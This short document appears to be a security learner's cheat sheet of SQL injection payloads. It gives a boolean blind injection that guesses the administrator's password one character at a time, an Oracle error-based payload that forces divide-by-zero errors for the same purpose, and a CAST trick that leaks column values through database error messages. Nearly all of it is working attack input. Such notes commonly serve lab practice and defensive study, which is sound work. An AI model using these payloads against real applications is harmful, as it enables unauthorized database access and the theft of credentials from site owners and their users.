#sql
determine if the first symbol of password is greater than 'm':
```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

then try next symbol and so on.

##### Error based SQL
```sql
(SELECT CASE WHEN ((select substr(password,6,1) from users where username='administrator')='a') THEN '' ELSE TO_CHAR(1/0) END FROM dual)
```
convert one type to another
```sql
CAST((SELECT example_column FROM example_table) AS int)
```
example_column value will be displayed in the error
